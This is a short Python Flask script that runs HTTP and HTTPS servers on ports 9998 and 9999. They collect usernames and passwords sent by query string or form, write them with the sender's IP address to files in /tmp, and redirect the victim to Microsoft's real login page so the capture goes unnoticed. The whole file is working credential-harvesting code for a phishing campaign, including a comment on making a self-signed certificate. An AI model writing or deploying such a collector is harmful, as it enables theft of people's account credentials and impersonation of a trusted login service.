from flask import Flask, request, redirect
from threading import Thread

http_app = Flask('http')
https_app = Flask('https')

@http_app.route('/log', methods=['GET'])
def log_http():
    username = request.args.get('u')
    password = request.args.get('p')
    ip = request.remote_addr
    with open('/tmp/http_creds.txt', 'a') as f:
        f.write(f"[HTTP] IP: {ip}, User: {username}, Pass: {password}\n")
    return redirect("https://login.microsoftonline.com")

@https_app.route('/capture', methods=['POST'])
def log_https():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    with open('/tmp/https_creds.txt', 'a') as f:
        f.write(f"[HTTPS] IP: {ip}, User: {username}, Pass: {password}\n")
    return redirect("https://login.microsoftonline.com")

def run_http():
    http_app.run(host='0.0.0.0', port=9998)

def run_https():
    # openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
    https_app.run(host='0.0.0.0', port=9999, ssl_context=('cert.pem', 'key.pem'))

if __name__ == '__main__':
    Thread(target=run_http).start()
    Thread(target=run_https).start()

